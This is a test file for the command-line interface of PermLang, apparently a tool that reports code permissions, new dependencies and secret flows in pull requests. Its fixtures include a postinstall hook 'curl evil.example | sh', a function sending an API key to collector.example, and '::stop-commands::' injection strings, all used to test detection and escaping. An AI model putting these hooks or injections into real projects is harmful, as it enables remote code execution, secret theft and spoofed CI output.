// CLI edge cases from the pre-release review. Runs the CLI in a temporary git
// repository whose code isn't in ./src.

import { execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { parseArgs } from "../src/args.js";
import { runCli } from "./run-cli.js";
import { removeTemporary } from "./temporary.js";

const repo = fileURLToPath(new URL("..", import.meta.url));

let dir: string;

function permlang(...args: string[]): { code: number; out: string } {
  // The temporary repository is the workspace, as it would be in its own GitHub Actions run.
  // (When these tests run in Actions, GITHUB_WORKSPACE is PermLang's own checkout.)
  return runCli(args, { cwd: dir, env: { GITHUB_WORKSPACE: dir } });
}

const git = (...args: string[]) => execFileSync("git", args, { cwd: dir, encoding: "utf8" });

beforeEach(() => {
  dir = mkdtempSync(path.join(tmpdir(), "permlang-cli-"));
  mkdirSync(path.join(dir, "my lib"));
  writeFileSync(path.join(dir, "my lib", "app.ts"), `export async function ping() {\n  return fetch("https://api.example.com/");\n}\n`);
  git("init", "-q");
  git("config", "user.email", "test@example.com");
  git("config", "user.name", "Test");
});

afterEach(() => removeTemporary(dir));

describe("permlang diff", () => {
  it("analyzes the given paths, not ./src", () => {
    expect(permlang("init", "my lib").code).toBe(0);
    git("add", "-A");
    git("commit", "-q", "-m", "base");
    writeFileSync(path.join(dir, "my lib", "app.ts"), `export async function ping() {\n  return fetch("https://data-broker.io/");\n}\n`);
    expect(permlang("lock", "my lib").code).toBe(0);

    const { code, out } = permlang("diff", "HEAD", "my lib", "--format", "markdown");
    expect(code).toBe(0);
    expect(out).toContain("<code>+ net(data-broker.io)</code>");
    expect(out).toContain("fetch(&quot;https:\u{200b}//data-broker.io/&quot;)");
  });

  // It used to say "No permission changes" here, with only a line in the job log saying the
  // code wasn't analyzed (found in the code review, G7).
  it("still prints the diff when the code can't be analyzed, and says the code wasn't analyzed", () => {
    permlang("init", "my lib");
    git("add", "-A");
    git("commit", "-q", "-m", "base");
    const { code, out } = permlang("diff", "HEAD", "--format", "markdown");
    expect(code).toBe(0);
    expect(out).toContain("PermLang couldn't analyze the code");
    expect(out.replaceAll("\u{200b}", "")).toContain("Not found: src");
    expect(out).not.toContain("No permission changes");
  });

  it("shows access the lock doesn't record yet, so a PR that skips `permlang lock` isn't reported as clean", () => {
    expect(permlang("init", "my lib").code).toBe(0);
    git("add", "-A");
    git("commit", "-q", "-m", "base");
    // An AI-style change: new network access, lock file left untouched.
    writeFileSync(path.join(dir, "my lib", "app.ts"), `export async function ping() {\n  return fetch("https://data-broker.io/");\n}\n`);
    git("add", "-A");
    git("commit", "-q", "-m", "change without lock");

    const md = permlang("diff", "HEAD~1", "my lib", "--format", "markdown");
    expect(md.code).toBe(0);
    expect(md.out).toContain("Not approved yet");
    expect(md.out).toContain("<code>+ net(data-broker.io)</code>");
    expect(md.out).not.toContain("No permission changes");

    const json = JSON.parse(permlang("diff", "HEAD~1", "my lib", "--format", "json").out) as { unrecorded: unknown };
    expect(json.unrecorded).not.toBeNull();

    // Once the lock is updated, the warning goes away and the access is still listed.
    expect(permlang("lock", "my lib").code).toBe(0);
    const approved = permlang("diff", "HEAD~1", "my lib", "--format", "markdown").out;
    expect(approved).not.toContain("Not approved yet");
    expect(approved).toContain("<code>+ net(data-broker.io)</code>");
  });

  it("accepts an absolute --lock path", () => {
    permlang("init", "my lib");
    git("add", "-A");
    git("commit", "-q", "-m", "base");
    const { code, out } = permlang("diff", "HEAD", "my lib", "--lock", path.join(dir, "permlang.lock.json"));
    expect(out).toContain("No permission changes");
    expect(code).toBe(0);
  });
});

describe("permlang diff --head", () => {
  it("compares two commits' locks", () => {
    permlang("init", "my lib");
    git("add", "-A");
    git("commit", "-q", "-m", "base");
    const { code, out } = permlang("diff", "HEAD", "my lib", "--head", "HEAD");
    expect(code).toBe(0);
    expect(out).toContain("No permission changes");
    // Comparing two commits, nothing is said about the working tree's workflows, but the field is there.
    expect(JSON.parse(permlang("diff", "HEAD", "my lib", "--head", "HEAD", "--json").out)).toMatchObject({ head: "HEAD", lockMoved: [], lockDeleted: false });
  });

  it("says so when the lock doesn't exist at that commit", () => {
    git("commit", "-q", "--allow-empty", "-m", "empty");
    permlang("init", "my lib");
    const { code, out } = permlang("diff", "HEAD", "my lib", "--head", "HEAD");
    expect(code).toBe(2);
    expect(out).toContain("permlang.lock.json doesn't exist at HEAD.");
  });
});

/** Writes a file under the temporary repository, creating its folder. */
function write(file: string, text: string) {
  mkdirSync(path.dirname(path.join(dir, file)), { recursive: true });
  writeFileSync(path.join(dir, file), text);
}

describe("permlang check output", () => {
  it("prints the report as JSON, with paths relative to the folder it runs in", () => {
    const { code, out } = permlang("check", "my lib", "--no-lock", "--json");
    expect(code).toBe(1);
    const report = JSON.parse(out) as { version: number; diagnostics: { file: string; code: string }[]; functions: { file: string; actual: string[]; kind?: string }[] };
    expect(report.version).toBe(1);
    expect(report.diagnostics).toEqual([expect.objectContaining({ file: "my lib/app.ts", code: "PERM003" })]);
    expect(report.functions).toEqual([
      expect.objectContaining({ file: "my lib/app.ts", actual: ["net(api.example.com)"] }),
      // The settings the check ran with, as the lock records them.
      expect.objectContaining({ file: "permlang.config.json", kind: "config", actual: ["permlang.files(my lib)", "permlang.strictness(development)", "permlang.tools(warn)", "permlang.unmapped(warn)"] }),
    ]);
  });

  it("says when there's nothing to report", () => {
    write("pure/math.ts", "export function add(a: number, b: number) { return a + b; }\n");
    expect(permlang("check", "pure", "--no-lock")).toEqual({ code: 0, out: "No permission violations in 1 file.\n" });
  });

  it("lists imports with no types, packages with no adapter, and @perm-unsafe overrides", () => {
    // Eleven typed packages PermLang has no adapter for; the text report shows ten.
    const names = Array.from({ length: 11 }, (_, i) => `pkg-${String.fromCharCode(97 + i)}`);
    for (const name of names) {
      write(`node_modules/${name}/package.json`, JSON.stringify({ name, version: "1.0.0", types: "index.d.ts" }));
      write(`node_modules/${name}/index.d.ts`, "export declare function go(): void;\n");
    }
    write(
      "mixed/app.ts",
      [
        `import { missing } from "not-installed";`,
        ...names.map((n, i) => `import { go as go${i} } from "${n}";`),
        `/** @perm-unsafe reason:"wraps a legacy SDK" */`,
        `export function legacy() { missing(); ${names.map((_, i) => `go${i}();`).join(" ")} }`,
        "",
      ].join("\n"),
    );
    const { out } = permlang("check", "mixed", "--no-lock");
    expect(out).toContain("1 import with no types, unchecked: not-installed.");
    expect(out).toMatch(/11 packages with no adapter, trusted \(calls\): pkg-a \(1\), .*, and 1 more \(see --json\)\./);
    expect(out).toContain("1 @perm-unsafe override (checks suppressed):\n  mixed/app.ts:");
    expect(out).toContain("legacy: wraps a legacy SDK");
  });

  it("loads adapters a config file lists, relative to the config file", () => {
    write("node_modules/acme-sms/package.json", JSON.stringify({ name: "acme-sms", version: "1.0.0", types: "index.d.ts" }));
    write("node_modules/acme-sms/index.d.ts", "export declare function send(to: string, text: string): void;\n");
    write("conf/acme-sms.json", JSON.stringify({ permlang: 1, package: "acme-sms", defines: ["sms.send"], default: [], functions: { send: ["sms.send"] } }));
    write("conf/permlang.config.json", JSON.stringify({ adapters: ["./acme-sms.json"] }));
    write("sms/alert.ts", `import { send } from "acme-sms";\nexport function alert() { send("+15550100", "hi"); }\n`);
    const { code, out } = permlang("check", "sms", "--no-lock", "--config", "conf/permlang.config.json");
    expect(code).toBe(1);
    expect(out).toContain("sms.send");
  });
});

describe("permlang spec", () => {
  const spec = (perms: string, implementsLine = "  implements: ping.ts#ping\n") =>
    `perm ping()\n${implementsLine}\n  must:\n    only call the example API\n\n  perms:\n    ${perms}\n`;
  beforeEach(() => write("svc/ping.ts", `export async function ping() {\n  return fetch("https://api.example.com/");\n}\n`));

  it("passes a spec whose implementation stays within its perms", () => {
    write("svc/ping.perm", spec("net(api.example.com)"));
    const { code, out } = permlang("spec", "svc");
    expect(code).toBe(0);
    expect(out).toContain("perm ping  ping.ts#ping\n  perms     no access beyond the declared scope\n  must      1 rule, not verified yet (phase 2)\n  examples  0 examples, not run yet (phase 2)");
    expect(out).toContain("1 spec, 0 failing.");
  });

  it("fails one whose implementation reaches beyond them", () => {
    write("svc/ping.perm", spec("env(HOME)"));
    const { code, out } = permlang("spec", "svc");
    expect(code).toBe(1);
    expect(out).toContain("FAIL: reaches net(api.example.com)");
    expect(out).toMatch(/svc\/ping\.perm:\d+ error SPEC003/);
  });

  it("fails one whose implementation reaches code it can't see, and says how to fix it", () => {
    write("svc/ping.ts", `import { send } from "untyped-pinger";\nexport function ping() {\n  send("https://api.example.com/");\n}\n`);
    write("svc/ping.perm", spec("net(api.example.com)"));
    const { code, out } = permlang("spec", "svc");
    expect(code).toBe(1);
    expect(out).toContain("perms     unchecked: reaches code PermLang can't see");
    expect(out).toContain(
      "error SPEC005: perm ping: ping reaches code PermLang can't see, so its permissions can't be checked: it calls into untyped-pinger, whose types can't be found.\n    -> install the missing types",
    );
  });

  // A spec that can't be parsed exits 2: 1 means permission errors and nothing else (the second
  // verification).
  it("reports a spec with no implementation, and one that can't be parsed", () => {
    write("svc/ping.perm", spec("net(api.example.com)", ""));
    write("svc/bad.perm", "perm broken(\n");
    const { code, out } = permlang("spec", "svc");
    expect(code).toBe(2);
    expect(out).toMatch(/svc\/bad\.perm:1 error SPEC001/);
    expect(out).toContain("implementation not found");
  });

  // Capabilities from the code went into spec's output unescaped, so a path in a string could
  // print `::stop-commands::` on a line of its own (the second verification, item 5).
  it("escapes text from the code, so it can't print a line of its own", () => {
    // Just enough of @types/node for process.env: this temporary repository has no node_modules.
    write("svc/node.d.ts", "declare var process: { env: { [key: string]: string | undefined } };\n");
    write("svc/ping.ts", 'export function ping() {\n  return process.env["X\\n::stop-commands::pwned\\n\\u001b[31m\\u202e"];\n}\n');
    write("svc/ping.perm", spec("net(api.example.com)"));
    const { code, out } = permlang("spec", "svc");
    expect(code).toBe(1);
    expect(out).toContain("FAIL: reaches env(X\\n::stop-commands::pwned\\n\\u001b[31m\\u202e)");
    expect(out).not.toMatch(/^::/m);
    expect(out).not.toMatch(new RegExp("[\\u001b\\u202e]"));
  });

  it("prints JSON, checks only the specs it's given, and says when there are none", () => {
    write("svc/ping.perm", spec("net(api.example.com)"));
    const json = JSON.parse(permlang("spec", "svc", "--json").out) as { errors: unknown[]; results: { spec: string; status: string }[] };
    expect(json).toEqual({ errors: [], results: [expect.objectContaining({ spec: "ping", status: "perms ok" })] });
    expect(permlang("spec", "svc", "--spec", "svc/nope.perm")).toEqual({ code: 2, out: "Not found: svc/nope.perm\n" });
    rmSync(path.join(dir, "svc", "ping.perm"));
    expect(permlang("spec", "svc")).toEqual({ code: 0, out: "No .perm specs found.\n" });
  });
});

describe("usage errors", () => {
  it.each([
    [[], /^Usage:/],
    [["frob"], /^Unknown command "frob"/],
    [["check", "--frob"], /^Unknown option "--frob"/],
    [["check", "--lock"], /^--lock needs a value\./],
    [["check", "my lib", "--strictness", "strict"], /^Strictness must be one of: sketch, development, production\./],
    [["check", "my lib", "--unmapped", "ignore"], /^"unmapped" must be one of: warn, error, trust\./],
    [["diff", "--format", "yaml"], /^--format must be text, markdown, or json\./],
    // A repository with no commits has no HEAD to compare with.
    [["diff"], /^Can't read permlang\.lock\.json at HEAD: /],
  ])("exits 2 on %j", (args, message) => {
    const { code, out } = permlang(...args);
    expect(code).toBe(2);
    expect(out).toMatch(message);
  });

  it("exits 2 on a diff with no lock file", () => {
    git("commit", "-q", "--allow-empty", "-m", "empty");
    expect(permlang("diff")).toEqual({ code: 2, out: "No permlang.lock.json. Run `permlang lock` first.\n" });
  });
});

// The Action passes its `args` to check and to diff. Options either command ignored let a workflow
// change what the comment compares (`--head`), or print help and pass (`-h`), without the check
// failing (found by the second verification, B; and `check --format json`, `lock --sarif`).
describe("options a command doesn't take", () => {
  it.each([
    [["check", "my lib", "-h"], /^-h goes on its own: `permlang check --help`\./],
    [["check", "--help", "my lib"], /^--help goes on its own/],
    [["check", "my lib", "--format", "json"], /^check takes --json, not --format: `permlang check --json`\./],
    [["spec", "--format", "json"], /^spec takes --json, not --format/],
    [["check", "my lib", "--head", "HEAD~1"], /^check doesn't take --head: it's an option of diff\./],
    [["check", "my lib", "--summary", "x.md"], /^check doesn't take --summary: it's an option of diff\./],
    [["lock", "my lib", "--sarif", "x.sarif"], /^lock doesn't take --sarif: it's an option of check\./],
    [["lock", "my lib", "--no-lock"], /^lock doesn't take --no-lock: it's an option of check and diff\./],
    [["init", "my lib", "--json"], /^init doesn't take --json: it's an option of check, diff and spec\./],
    [["check", "my lib", "--workflow"], /^check doesn't take --workflow: it's an option of init\./],
    [["diff", "HEAD", "--base", "HEAD"], /^diff takes the base commit as its first argument, not --base/],
    [["diff", "HEAD", "--spec", "a.perm"], /^diff doesn't take --spec: it's an option of spec\./],
    // A value that's another option would hide it: `--format --lock newdir`.
    [["check", "my lib", "--lock", "--no-lock"], /^--lock needs a value, not the option "--no-lock"\./],
    [["diff", "HEAD", "--format", "--lock", "x"], /^--format needs a value, not the option "--lock"\./],
    [["check", "my lib", "--frob"], /^Unknown option "--frob"/],
    [["frob", "--help"], /^Unknown command "frob"/],
  ])("exits 2 on %j", (args, message) => {
    const { code, out } = permlang(...args);
    expect(code).toBe(2);
    expect(out).toMatch(message);
  });

  it("lets diff take check's options, so the Action can pass it the same arguments", () => {
    permlang("lock", "my lib");
    git("add", "-A");
    git("commit", "-q", "-m", "base");
    const { code, out } = permlang("diff", "HEAD", "my lib", "--require-lock", "--github-annotations", "--sarif", "unused.sarif", "--format", "markdown");
    expect(code).toBe(0);
    expect(out).toContain("No permission changes.");
    // --json is diff's --format json, and an explicit --format wins (the Action adds one after its args).
    expect(JSON.parse(permlang("diff", "HEAD", "my lib", "--json").out)).toMatchObject({ base: "HEAD", functions: [] });
    expect(permlang("diff", "HEAD", "my lib", "--json", "--format", "markdown").out).toMatch(/^<!-- permlang-diff -->/);
  });

  it("still prints a comment when diff's arguments are wrong, to replace the Action's earlier one", () => {
    const { code, out } = permlang("diff", "HEAD", "--workflow", "--format", "markdown");
    expect(code).toBe(2);
    expect(out).toMatch(/^<!-- permlang-diff -->\n### PermLang permission diff\n\n> \[!CAUTION\]\n> \*\*PermLang couldn't compute the permission diff\*\*.*diff doesn't take --workflow/);
  });

  it("prints the no-lock notice, which the Action recognizes, when neither commit has a lock file", () => {
    git("commit", "-q", "--allow-empty", "-m", "empty");
    const { code, out } = permlang("diff", "HEAD", "my lib", "--format", "markdown");
    expect(code).toBe(2);
    expect(out).toMatch(/^<!-- permlang-diff -->\n### PermLang permission diff\n\nThere's no <code>permlang\.lock\.json<\/code> in this pull request or at its base commit/);
    expect(out).toContain("<!-- permlang-status: no-lock -->\nNo permlang.lock.json. Run `permlang lock` first.");
    // In text there's only the error.
    expect(permlang("diff", "HEAD", "my lib")).toEqual({ code: 2, out: "No permlang.lock.json. Run `permlang lock` first.\n" });
  });
});

describe("each option", () => {
  it("sets what it names, and repeats where it can", () => {
    const diff = ["HEAD", "src", "--project", "a.json", "--config", "c.json", "--adapter", "x.json", "--adapter", "y.json", "--strictness", "sketch", "--unmapped", "trust", "--lock", "l.json"];
    const flags = ["--no-lock", "--require-lock", "--json", "--github-annotations", "--sarif", "s.sarif", "--head", "h", "--format", "markdown", "--summary", "s.md"];
    expect(parseArgs("diff", [...diff, ...flags])).toEqual({
      paths: ["HEAD", "src"],
      project: "a.json",
      config: "c.json",
      adapters: ["x.json", "y.json"],
      strictness: "sketch",
      unmapped: "trust",
      lock: "l.json",
      noLock: true,
      requireLock: true,
      json: true,
      githubAnnotations: true,
      sarif: "s.sarif",
      head: "h",
      format: "markdown",
      summary: "s.md",
      workflow: false,
      specs: [],
    });
    expect(parseArgs("check", ["-p", "t.json", "--base", "b"])).toMatchObject({ project: "t.json", base: "b", paths: [] });
    expect(parseArgs("spec", ["--spec", "a.perm", "--spec", "b.perm"]).specs).toEqual(["a.perm", "b.perm"]);
    expect(parseArgs("init", ["--workflow"]).workflow).toBe(true);
  });

  it("-p is --project", () => {
    write("tsconfig.app.json", JSON.stringify({ include: ["my lib"] }));
    expect(permlang("check", "-p", "tsconfig.app.json", "--no-lock", "--json").out).toBe(permlang("check", "--project", "tsconfig.app.json", "--no-lock", "--json").out);
  });
});

// The Action puts the diff in the job summary uncut, where GitHub takes far more than in a comment.
describe("permlang diff --summary", () => {
  it("also writes the markdown diff, uncut, to the file it names", () => {
    permlang("lock", "my lib");
    git("add", "-A");
    git("commit", "-q", "-m", "base");
    const many = Array.from({ length: 600 }, (_, i) => `export async function f${i}() {\n  return fetch("https://host-${i}-${"x".repeat(60)}.example/");\n}\n`).join("");
    writeFileSync(path.join(dir, "my lib", "app.ts"), many);
    const { code, out } = permlang("diff", "HEAD", "my lib", "--format", "markdown", "--summary", "summary.md");
    expect(code).toBe(0);
    expect(out).toMatch(/Cut short/);
    const summary = readFileSync(path.join(dir, "summary.md"), "utf8");
    expect(summary).toMatch(/^<!-- permlang-diff -->\n### PermLang permission diff\n/);
    expect(summary).not.toMatch(/Cut short/);
    expect(summary.split("\n").filter((l) => l.startsWith("| <code>+ net("))).toHaveLength(600);
    // Whatever the output format.
    expect(permlang("diff", "HEAD", "my lib", "--json", "--summary", "summary2.md").code).toBe(0);
    expect(readFileSync(path.join(dir, "summary2.md"), "utf8")).toBe(summary);
  });

  it("is an option of diff alone, and needs a file", () => {
    expect(permlang("check", "my lib", "--summary", "s.md")).toMatchObject({ code: 2, out: expect.stringMatching(/^check doesn't take --summary: it's an option of diff\./) });
    expect(permlang("diff", "HEAD", "--summary")).toMatchObject({ code: 2, out: expect.stringMatching(/^--summary needs a value\./) });
  });
});

describe("configuration errors", () => {
  it("exits 2 on a config file that isn't an object", () => {
    writeFileSync(path.join(dir, "permlang.config.json"), "null\n");
    const { code, out } = permlang("check", "my lib");
    expect(code).toBe(2);
    expect(out).toMatch(/permlang\.config\.json.*object/);
  });

  it.each([
    ["{ not json", /^Can't read permlang\.config\.json: /],
    [`{ "adapters": "./a.json" }`, /^permlang\.config\.json: "adapters" must be a list of manifest paths\./],
    [`{ "strictness": 3 }`, /^permlang\.config\.json: "strictness" must be one of: sketch, development, production\./],
    [`{ "strictness": "strict" }`, /^Strictness must be one of/],
    [`{ "tools": "ignore" }`, /^"tools" must be one of: warn, error, trust\./],
  ])("exits 2 on the config %s", (config, message) => {
    writeFileSync(path.join(dir, "permlang.config.json"), config);
    const { code, out } = permlang("check", "my lib");
    expect(code).toBe(2);
    expect(out).toMatch(message);
  });

  // Field and capability names from an adapter manifest went into the error raw, so a manifest
  // could print `::stop-commands::` on a line of its own (the second verification, item 5).
  it("escapes what an invalid adapter manifest says, so it can't print a line of its own", () => {
    const evil = "x\n::stop-commands::pwned\n::error::FAKE";
    writeFileSync(path.join(dir, "acme.json"), JSON.stringify({ permlang: 1, package: "acme", [evil]: 1, defines: [`acme.${evil}`], functions: { [evil]: [`acme.${evil}`] } }));
    const { code, out } = permlang("check", "my lib", "--adapter", "acme.json", "--no-lock");
    expect(code).toBe(2);
    expect(out).toContain('unknown field "x\\n::stop-commands::pwned\\n::error::FAKE"');
    expect(out).toContain('invalid capability name "acme.x\\n::stop-commands::pwned\\n::error::FAKE"');
    expect(out).toContain('functions["x\\n::stop-commands::pwned\\n::error::FAKE"]');
    expect(out).not.toMatch(/^::/m);
  });
});

describe("data-flow rules", () => {
  it("fails a function that can send a protected secret to another host", () => {
    writeFileSync(path.join(dir, "permlang.config.json"), JSON.stringify({ flows: [{ from: "env(API_KEY)", to: ["net(api.example.com)"] }] }));
    // This temporary repository has no node_modules: just enough of @types/node for process.env.
    writeFileSync(
      path.join(dir, "my lib", "node.d.ts"),
      "declare namespace NodeJS { interface ProcessEnv { [key: string]: string | undefined } }\ndeclare var process: { env: NodeJS.ProcessEnv };\n",
    );
    writeFileSync(
      path.join(dir, "my lib", "leak.ts"),
      "export async function leak() {\n  const key = process.env.API_KEY;\n  await fetch(\"https://collector.example/k\", { body: key });\n}\n",
    );
    // A rule is asked for explicitly, so it fails at every strictness level, sketch included.
    const { code, out } = permlang("check", "my lib", "--no-lock", "--strictness", "sketch");
    expect(code).toBe(1);
    expect(out).toContain("my lib/leak.ts:3:9 error PERM009: leak reads env(API_KEY) and can send to net(collector.example)");
    expect(permlang("check", "my lib", "--no-lock").out).toContain("error PERM009");
  });

  it("rejects a malformed rule", () => {
    writeFileSync(path.join(dir, "permlang.config.json"), JSON.stringify({ flows: [{ from: "env(API_KEY)" }] }));
    const { code, out } = permlang("check", "my lib", "--no-lock");
    expect(code).toBe(2);
    expect(out).toContain('flows[0]: "to" must be a list of capabilities');
  });

  it("rejects an app capability no adapter defines, once the adapters are loaded", () => {
    writeFileSync(path.join(dir, "permlang.config.json"), JSON.stringify({ flows: [{ from: "env(API_KEY)", to: ["email.sent"] }] }));
    const { code, out } = permlang("check", "my lib", "--no-lock");
    expect(code).toBe(2);
    expect(out).toContain('permlang.config.json: flows[0]: "to" lists email.sent, which no adapter defines, so it could never match.');
  });
});

describe("tools given to AI models", () => {
  it("warns about a tool a model can point anywhere, and marks its new access in the comment", () => {
    writeFileSync(path.join(dir, "my lib", "ai.d.ts"), 'declare module "ai" { export function tool<T>(definition: T): T; }\n');
    expect(permlang("init", "my lib").code).toBe(0);
    git("add", "-A");
    git("commit", "-q", "-m", "base");
    writeFileSync(
      path.join(dir, "my lib", "tools.ts"),
      'import { tool } from "ai";\nexport const browse = tool({ description: "Fetch a page", execute: async ({ url }: { url: string }) => fetch(url) });\n',
    );

    const check = permlang("check", "my lib", "--strictness", "sketch");
    expect(check.out).toContain("my lib/tools.ts:2:23 warning PERM008: tool browse (ai) can be called by an AI model, and reaches net.");
    expect(check.out).toContain("1 tool an AI model can call:\n  my lib/tools.ts:2 browse (ai): net");
    const md = permlang("diff", "HEAD", "my lib", "--format", "markdown").out;
    expect(md).toMatch(/<code>\+ net<\/code> \|.*⚠️ An AI model can trigger this, through <code>browse<\/code><\/sub> \|/);
  });
});

describe("project configuration", () => {
  it("fails a change that adds a secret to a workflow, and shows it in the comment", () => {
    const workflow = path.join(dir, ".github", "workflows", "ci.yml");
    mkdirSync(path.dirname(workflow), { recursive: true });
    writeFileSync(workflow, "on: [pull_request]\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n");
    expect(permlang("init", "my lib").code).toBe(0);
    git("add", "-A");
    git("commit", "-q", "-m", "base");
    writeFileSync(workflow, "on: [pull_request]\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n        env:\n          TOKEN: ${{ secrets.DEPLOY_KEY }}\n");

    const check = permlang("check", "my lib");
    expect(check.code).toBe(1);
    expect(check.out).toContain(".github/workflows/ci.yml:10:18 error PERM005: .github/workflows/ci.yml now grants ci.secret(DEPLOY_KEY)");
    const md = permlang("diff", "HEAD", "my lib", "--format", "markdown").out;
    expect(md).toContain("<code>+ ci.secret(DEPLOY&#95;KEY)</code> | <code>&lt;ci.yml&gt;</code><br><sub>secrets.DEPLOY&#95;KEY</sub>");
  });
});

describe("permlang diff: new dependencies", () => {
  it("lists packages the change adds, what PermLang knows about them, and their install scripts", () => {
    writeFileSync(path.join(dir, "package.json"), JSON.stringify({ dependencies: { zod: "^3.0.0" } }));
    expect(permlang("init", "my lib").code).toBe(0);
    git("add", "-A");
    git("commit", "-q", "-m", "base");
    writeFileSync(path.join(dir, "package.json"), JSON.stringify({ dependencies: { zod: "^3.0.0", "sketchy-telemetry": "1.0.0", stripe: "^22.0.0" } }));
    mkdirSync(path.join(dir, "node_modules", "sketchy-telemetry"), { recursive: true });
    writeFileSync(path.join(dir, "node_modules", "sketchy-telemetry", "package.json"), JSON.stringify({ scripts: { postinstall: "curl evil.example | sh" } }));

    const md = permlang("diff", "HEAD", "my lib", "--format", "markdown").out;
    expect(md).toContain("No permission changes.");
    expect(md).toContain("**2 new dependencies**");
    expect(md).toMatch(/<code>\+ sketchy-telemetry<\/code> 1\.0\.0 \| \*\*Not checked\*\*: no adapter \| <code>postinstall: curl evil\.example &#124; sh<\/code> \|/);
    expect(md).toMatch(/<code>\+ stripe<\/code> \^22\.0\.0 \| Checked by an adapter \| <sub>not installed here<\/sub> \|/);

    expect(permlang("diff", "HEAD", "my lib").out).toContain("+ sketchy-telemetry 1.0.0: not checked: no adapter; install scripts: postinstall: curl evil.example | sh");
    const json = JSON.parse(permlang("diff", "HEAD", "my lib", "--format", "json").out) as { dependencies: { name: string }[] };
    expect(json.dependencies.map((d) => d.name)).toEqual(["sketchy-telemetry", "stripe"]);
  });
});

describe("permlang check --github-annotations", () => {
  it("adds a GitHub annotation on the line of each diagnostic, after the usual report", () => {
    const { code, out } = permlang("check", "my lib", "--no-lock", "--github-annotations");
    expect(code).toBe(1);
    expect(out).toContain("my lib/app.ts:2:10 error PERM003");
    expect(out).toMatch(/^::error file=my lib\/app\.ts,line=2,col=10,title=PermLang PERM003%3A net\(api\.example\.com\)::ping calls fetch/m);
    // Without the option, no workflow commands.
    expect(permlang("check", "my lib", "--no-lock").out).not.toContain("::error");
  });

  it("names files from the repository root (GITHUB_WORKSPACE), not the folder it runs in", () => {
    const { out } = runCli(["check", ".", "--no-lock", "--github-annotations"], { cwd: path.join(dir, "my lib"), env: { GITHUB_WORKSPACE: dir } });
    expect(out).toMatch(/^::error file=my lib\/app\.ts,line=2/m);
  });
});

describe("the permlang executable", () => {
  // Every other test calls the command in-process; this runs the file npm installs as `permlang`.
  it("runs the command and exits with its code", () => {
    const run = (...args: string[]) => {
      try {
        return { code: 0, out: execFileSync(process.execPath, [path.join(repo, "node_modules", "tsx", "dist", "cli.mjs"), path.join(repo, "src", "cli.ts"), ...args], { cwd: dir, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }) };
      } catch (e) {
        const err = e as { status: number; stdout: string };
        return { code: err.status, out: err.stdout };
      }
    };
    expect(run("--version").out.trim()).toBe(JSON.parse(readFileSync(path.join(repo, "package.json"), "utf8")).version);
    const failing = run("check", "my lib", "--no-lock");
    expect(failing.code).toBe(1);
    expect(failing.out).toContain("my lib/app.ts:2:10 error PERM003");
  });
});

describe("permlang check --sarif", () => {
  it("writes the findings as SARIF, with paths from the repository root", () => {
    const { code } = permlang("check", "my lib", "--no-lock", "--sarif", "permlang.sarif");
    expect(code).toBe(1);
    const sarif = JSON.parse(readFileSync(path.join(dir, "permlang.sarif"), "utf8")) as {
      runs: { results: { ruleId: string; locations: { physicalLocation: { artifactLocation: { uri: string }; region: { startLine: number } } }[] }[] }[];
    };
    const [result] = sarif.runs[0]!.results;
    expect(result!.ruleId).toBe("PERM003");
    expect(result!.locations[0]!.physicalLocation.artifactLocation.uri).toBe("my%20lib/app.ts");
    expect(result!.locations[0]!.physicalLocation.region.startLine).toBe(2);
  });
});

describe("help", () => {
  it("prints usage for a subcommand's --help instead of an unknown-option error", () => {
    for (const command of ["check", "lock", "diff", "init", "spec"]) {
      const { code, out } = permlang(command, "--help");
      expect(code).toBe(0);
      expect(out).toContain("Usage:");
      expect(out).not.toContain("Unknown option");
    }
  });
});

describe("permlang --version", () => {
  it("prints the package version", () => {
    const { version } = JSON.parse(readFileSync(path.join(repo, "package.json"), "utf8")) as { version: string };
    for (const flag of ["--version", "-v"]) expect(permlang(flag)).toEqual({ code: 0, out: `${version}\n` });
  });
});
